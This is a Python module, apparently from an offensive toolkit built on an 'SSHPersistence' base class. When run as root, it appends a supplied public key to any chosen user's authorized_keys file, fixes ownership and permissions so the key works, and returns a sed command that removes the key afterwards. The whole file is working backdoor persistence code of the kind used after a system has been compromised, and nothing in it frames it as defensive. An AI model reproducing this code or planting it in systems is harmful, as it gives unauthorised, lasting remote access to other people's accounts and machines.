import os
import pwd
from ..core import SSHPersistence

class RootUserInjector(SSHPersistence):
    def inject_for_user(self, target_user: str, public_key: str):
        if not self.is_root:
            print("[!] Root required to inject key for other users")
            return None

        try:
            user_info = pwd.getpwnam(target_user)
            user_home = user_info.pw_dir
            ssh_dir = f"{user_home}/.ssh"
            auth_file = f"{ssh_dir}/authorized_keys"

            os.makedirs(ssh_dir, mode=0o700, exist_ok=True)
            os.chown(ssh_dir, user_info.pw_uid, user_info.pw_gid)

            with open(auth_file, 'a') as f:
                f.write(f"{public_key}\n")

            os.chown(auth_file, user_info.pw_uid, user_info.pw_gid)
            os.chmod(auth_file, 0o600)

            print(f"[+] Key injected for {target_user} → {auth_file}")
            return {
                'method': 'root_user_injection',
                'user': target_user,
                'file': auth_file,
                'remove_cmd': f"sed -i '/{public_key[:40]}/d' {auth_file}"
            }
        except Exception as e:
            print(f"[-] Error: {e}")
            return None